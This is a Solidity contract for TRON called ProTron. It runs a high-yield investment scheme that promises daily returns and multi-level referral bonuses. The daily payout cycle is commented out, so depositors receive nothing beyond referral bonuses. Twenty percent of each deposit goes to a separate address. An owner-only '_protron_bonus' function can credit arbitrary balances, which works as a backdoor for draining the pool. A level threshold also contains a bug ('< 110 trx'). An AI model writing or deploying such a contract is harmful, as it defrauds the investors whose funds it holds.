//SourceUnit: ProTron.sol

pragma solidity 0.5.10;

contract ProTron {

	using SafeMath for *;

	struct Deposit {
		bool is_complete;
		
		uint256 deposit_amount;
		
		uint256 max_payout;
		uint256 current_payout;
		
		uint256 daily_payout;
		string daily_percent;
	}

	struct User {
		address upline;
		bool is_upline_set;

		uint256 total_deposits;

		uint256 max_payout;
		uint256 current_payout;

		uint256 balance;

		uint256 referrals_count;

		uint256 first_line_deposits;

		uint256 total_withdraw;

		uint256 partnership_enabled_level;

		uint256 lidership_enabled_level;
		uint256 lidership_paid_level;

		Deposit[] deposits;
	}

	address payable public owner;
	address payable public ensurance;

	mapping(address => User) public users;

	uint public pool_last_cycle_time = now;

	uint256 public pool_cycle;
	uint256 public pool_balance;

	uint256 public total_users = 1;
	uint256 public total_deposited;
	uint256 public total_withdraw;

	uint256[] public partnership_line_percents;

	address[] public users_addresses;
	
	event Upline(address indexed addr, address indexed upline);
	event NewDeposit(address indexed addr, uint256 amount);
	event PartnershipBonus(address indexed addr, address indexed from, uint256 amount);
	event DepositPayout(address indexed addr, uint256 amount);
	event PartnershipPayout(address indexed addr, address indexed from, uint256 amount, uint256 line);
	event Withdraw(address indexed addr, uint256 amount);
	event LidershipBonus(address indexed addr, uint256 amount);

	modifier onlyOwner() {
		require(msg.sender == owner, "only Owner");
		_;
	}

	constructor(address payable _owner, address payable _ensurance) public {
		owner = _owner;
		ensurance = _ensurance;

		partnership_line_percents.push(35);

		partnership_line_percents.push(10);
		partnership_line_percents.push(10);
		partnership_line_percents.push(10);
		partnership_line_percents.push(10);
		partnership_line_percents.push(10);

		partnership_line_percents.push(8);
		partnership_line_percents.push(8);
		partnership_line_percents.push(8);
		partnership_line_percents.push(8);
		partnership_line_percents.push(8);

		partnership_line_percents.push(5);
		partnership_line_percents.push(5);
		partnership_line_percents.push(5);

		partnership_line_percents.push(3);
		partnership_line_percents.push(3);
		partnership_line_percents.push(3);
	}

	function _set_upline(address _addr, address _upline) private {

		if(!users[_addr].is_upline_set) {
			
			total_users++;

			users_addresses.push(_addr);
		}

		if(users[_addr].upline == address(0) && _upline != _addr && !users[_addr].is_upline_set && users[_upline].is_upline_set) {
			
			users[_addr].upline = _upline;
			
			users[_upline].referrals_count++;

			emit Upline(_addr, _upline);
		}

		users[_addr].is_upline_set = true;
	}

	function _deposit(address _addr, uint256 _amount) private {
		
		require(_amount >= 100 trx, "Amount less then 100 TRX");

		uint256 _daily_payout = 0;	
		string memory _daily_percent = '1';	
		uint256 _max_payout = _amount * 4;	

		if (_amount >= 100 trx && _amount <= 100000 trx) {
			
			_daily_percent = '1';
			_daily_payout = _amount.div(100);
			
		} else if (_amount >= 100001 trx && _amount <= 200000 trx) {
			
			_daily_percent = '1.1';
			_daily_payout = _amount.mul(11).div(1000);
		
		} else if (_amount >= 200001 trx && _amount <= 300000 trx) {
			
			_daily_percent = '1.2';
			_daily_payout = _amount.mul(12).div(1000);

		} else if (_amount >= 300001 trx && _amount <= 400000 trx) {
			
			_daily_percent = '1.3';
			_daily_payout = _amount.mul(13).div(1000);
		
		} else if (_amount >= 400001 trx && _amount <= 500000 trx) {
			
			_daily_percent = '1.4';
			_daily_payout = _amount.mul(14).div(1000);
		
		} else if (_amount >= 500001 trx) {
			
			_daily_percent = '1.5';
			_daily_payout = _amount.mul(15).div(1000);
		
		}


		Deposit memory new_deposit = Deposit({
			is_complete: false,
			deposit_amount: _amount,
		
			max_payout: _max_payout,
			current_payout: 0,
		
			daily_payout: _daily_payout,
			daily_percent: _daily_percent
		});

		users[_addr].deposits.push(new_deposit);
		
		users[_addr].total_deposits += _amount;
		users[_addr].max_payout += _max_payout;

		if (users[_addr].upline != address(0)) {
			users[users[_addr].upline].first_line_deposits += _amount;

			// update partnership enabled level for upline
			_update_partnership_enabled_level(users[_addr].upline);

			// update lidership enabled level for upline
			_update_lidership_enabled_level(users[_addr].upline);

			// lidership bonus payout for upline
			_lidership_payout(users[_addr].upline);

			// direct partnership bonus 10% for upline
			if (users[users[_addr].upline].max_payout > users[users[_addr].upline].current_payout) {

				uint256 _bonus_amount = _amount / 10;

				if ( (users[users[_addr].upline].current_payout + _bonus_amount) > users[users[_addr].upline].max_payout ) {

					_bonus_amount = users[users[_addr].upline].max_payout - users[users[_addr].upline].current_payout;

				}

				users[users[_addr].upline].current_payout += _bonus_amount;
				users[users[_addr].upline].balance += _bonus_amount;

				emit PartnershipBonus(users[_addr].upline, _addr, _bonus_amount);

			}
			
		}

		total_deposited += _amount;
		pool_balance += _amount;
		
		emit NewDeposit(_addr, _amount);

		// <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
		// if(pool_last_cycle_time + 1 days < now) {
		// 	_process_cycle();
		// }

		ensurance.transfer(_amount * 2 / 10);
		
	}

	function deposit(address _upline) payable external {
		_set_upline(msg.sender, _upline);
		_deposit(msg.sender, msg.value);
	}

	function withdraw() external {
		
		require(users[msg.sender].balance > 0, "Zero balance");

		users[msg.sender].total_withdraw += users[msg.sender].balance;
		total_withdraw += users[msg.sender].balance;

		msg.sender.transfer(users[msg.sender].balance);

		emit Withdraw(msg.sender, users[msg.sender].balance);

		pool_balance -= users[msg.sender].balance;

		users[msg.sender].balance = 0;
	}

	function _update_partnership_enabled_level(address _addr) private {
		if (users[_addr].first_line_deposits > 0 trx && users[_addr].first_line_deposits < 10000 trx) {
		
			users[_addr].partnership_enabled_level = 0;

		} else if (users[_addr].first_line_deposits >= 10000 trx && users[_addr].first_line_deposits < 20000 trx) {
		
			users[_addr].partnership_enabled_level = 1;
			
		} else if (users[_addr].first_line_deposits  >= 20000 trx && users[_addr].first_line_deposits  < 30000 trx) {
			
			users[_addr].partnership_enabled_level = 2;
		
		} else if (users[_addr].first_line_deposits  >= 30000 trx && users[_addr].first_line_deposits  < 50000 trx) {
			
			users[_addr].partnership_enabled_level = 3;
		
		} else if (users[_addr].first_line_deposits  >= 50000 trx && users[_addr].first_line_deposits  < 80000 trx) {
			
			users[_addr].partnership_enabled_level = 4;
		
		} else if (users[_addr].first_line_deposits  >= 80000 trx && users[_addr].first_line_deposits  < 110 trx) {
			
			users[_addr].partnership_enabled_level = 5;
		
		} else if (users[_addr].first_line_deposits  >= 100000 trx && users[_addr].first_line_deposits  < 150000 trx) {
			
			users[_addr].partnership_enabled_level = 6;
		
		} else if (users[_addr].first_line_deposits  >= 150000 trx && users[_addr].first_line_deposits  < 200000 trx) {
			
			users[_addr].partnership_enabled_level = 7;
		
		} else if (users[_addr].first_line_deposits  >= 200000 trx && users[_addr].first_line_deposits  < 250000 trx) {
			
			users[_addr].partnership_enabled_level = 8;
		
		} else if (users[_addr].first_line_deposits  >= 250000 trx && users[_addr].first_line_deposits  < 300000 trx) {
			
			users[_addr].partnership_enabled_level = 9;
		
		} else if (users[_addr].first_line_deposits  >= 300000 trx && users[_addr].first_line_deposits  < 350000 trx) {
			
			users[_addr].partnership_enabled_level = 10;
		
		} else if (users[_addr].first_line_deposits  >= 350000 trx && users[_addr].first_line_deposits  < 400000 trx) {
			
			users[_addr].partnership_enabled_level = 11;
		
		} else if (users[_addr].first_line_deposits  >= 400000 trx && users[_addr].first_line_deposits  < 450000 trx) {
			
			users[_addr].partnership_enabled_level = 12;
		
		} else if (users[_addr].first_line_deposits  >= 450000 trx && users[_addr].first_line_deposits  < 500000 trx) {
			
			users[_addr].partnership_enabled_level = 13;
		
		} else if (users[_addr].first_line_deposits  >= 500000 trx && users[_addr].first_line_deposits  < 550000 trx) {
			
			users[_addr].partnership_enabled_level = 14;
		
		} else if (users[_addr].first_line_deposits  >= 550000 trx && users[_addr].first_line_deposits  < 600000 trx) {
			
			users[_addr].partnership_enabled_level = 15;
		
		} else if (users[_addr].first_line_deposits  >= 600000 trx) {
			
			users[_addr].partnership_enabled_level = 16;
		
		}
	}

	function _update_lidership_enabled_level(address _addr) private {

		for(uint8 i = 1; i < 11; i++) {

			if (users[_addr].first_line_deposits >= i * 1000000 trx) {
				users[_addr].lidership_enabled_level = i;
			}

		}

	}

	function _lidership_payout(address _addr) private {

		if (users[_addr].lidership_enabled_level > users[_addr].lidership_paid_level) {

			uint256 _bonus_amount = users[_addr].first_line_deposits.mul(5).div(100);

			if ( (users[_addr].current_payout + _bonus_amount) > users[_addr].max_payout ) {

				_bonus_amount = users[_addr].max_payout - users[_addr].current_payout;

			}

			users[_addr].current_payout += _bonus_amount;
			users[_addr].balance += _bonus_amount;

			users[_addr].lidership_paid_level = users[_addr].lidership_enabled_level;

			emit LidershipBonus(_addr, _bonus_amount);

		}

	}

	function _protron_bonus(address _addr, uint256 _trx_amount) external onlyOwner { 

		require(users[_addr].max_payout > 0, "Inactive user");

		users[_addr].balance += _trx_amount * 1 trx; 

	}

	function _partnership_payout(address _addr, uint256 _amount) private {
		address _upline = users[_addr].upline;

		for(uint8 i = 0; i < partnership_line_percents.length; i++) {
			if(_upline == address(0)) break;
			
			if(users[_upline].partnership_enabled_level >= i) {
				uint256 _partnership_payout_amount = _amount * partnership_line_percents[i] / 100;
				
				if ( (users[_upline].current_payout + _partnership_payout_amount) > users[_upline].max_payout ) {

					_partnership_payout_amount = users[_upline].max_payout - users[_upline].current_payout;

				}

				users[_upline].current_payout += _partnership_payout_amount;
				users[_upline].balance += _partnership_payout_amount;

				emit PartnershipPayout(_upline, _addr, _partnership_payout_amount, i+1);
			}

			_upline = users[_upline].upline;
		}
	}

	function _process_cycle() private {
		pool_last_cycle_time = now;
		pool_cycle++;

		for(uint256 i = 0; i < users_addresses.length; i++) {

			if (users[users_addresses[i]].current_payout >= users[users_addresses[i]].max_payout) {

				for(uint256 j = 0; j < users[users_addresses[i]].deposits.length; j++) {

					users[users_addresses[i]].deposits[j].is_complete = true;

				}


			} else {

				uint256 _current_daily_payout = 0;

				for(uint256 j = 0; j < users[users_addresses[i]].deposits.length; j++) {

					if (users[users_addresses[i]].deposits[j].current_payout >= users[users_addresses[i]].deposits[j].max_payout) {
						users[users_addresses[i]].deposits[j].is_complete = true;
					}

					if (!users[users_addresses[i]].deposits[j].is_complete) {

						uint256 _current_deposit_payout = users[users_addresses[i]].deposits[j].daily_payout;

						if ( (users[users_addresses[i]].deposits[j].current_payout + _current_deposit_payout) > users[users_addresses[i]].deposits[j].max_payout ) {

							_current_deposit_payout = users[users_addresses[i]].deposits[j].max_payout - users[users_addresses[i]].deposits[j].current_payout;

							users[users_addresses[i]].deposits[j].current_payout += _current_deposit_payout;

							users[users_addresses[i]].deposits[j].is_complete = true;

						}

						_current_daily_payout += _current_deposit_payout;

					}

				}

				if (_current_daily_payout > 0) {

					if ( (users[users_addresses[i]].current_payout + _current_daily_payout) > users[users_addresses[i]].max_payout ) {

						_current_daily_payout = users[users_addresses[i]].max_payout - users[users_addresses[i]].current_payout;

					}

					users[users_addresses[i]].current_payout += _current_daily_payout;
					users[users_addresses[i]].balance += _current_daily_payout;

					emit DepositPayout(users_addresses[i], _current_daily_payout);

					_partnership_payout(users_addresses[i], _current_daily_payout);

				}

			}
		}
		
	}

}

library SafeMath {

	/**
	* @dev Multiplies two numbers, throws on overflow.
	*/
	function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
		if (a == 0) {
			return 0;
		}
		c = a * b;
		assert(c / a == b);
		return c;
	}

	/**
	* @dev Integer division of two numbers, truncating the quotient.
	*/
	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		// assert(b > 0); // Solidity automatically throws when dividing by 0
		// uint256 c = a / b;
		// assert(a == b * c + a % b); // There is no case in which this doesn't hold
		return a / b;
	}

	/**
	* @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
	*/
	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		assert(b <= a);
		return a - b;
	}

	/**
	* @dev Adds two numbers, throws on overflow.
	*/
	function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
		c = a + b;
		assert(c >= a);
		return c;
	}
}